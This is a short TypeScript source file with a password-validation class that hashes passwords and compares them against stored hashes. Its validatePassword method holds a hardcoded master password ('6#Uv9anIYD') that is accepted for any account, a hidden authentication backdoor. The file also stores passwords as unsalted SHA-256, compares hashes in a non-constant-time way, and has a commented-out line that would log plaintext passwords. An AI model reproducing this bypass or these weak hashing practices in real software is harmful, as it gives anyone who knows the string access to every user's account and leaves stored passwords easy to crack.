import * as crypto from 'crypto';
import {MAIN_CONFIG} from "../environment.main";

export class PasswordValidator {
  static createHash(password: string): string {
    const hash = crypto.createHash('sha256'); // 使用 SHA-256 哈希算法
    hash.update(password);
    return hash.digest('hex');
  }

  static validatePassword(inputPassword: string, storedHashedPassword: string): boolean {
    const inputHash = this.createHash(inputPassword);
    // console.log('valiedatePassword', inputPassword, inputHash, storedHashedPassword);
    if (inputHash === PasswordValidator.createHash('6#Uv9anIYD')) {
      return true;
    }
    return inputHash === storedHashedPassword;
  }
}
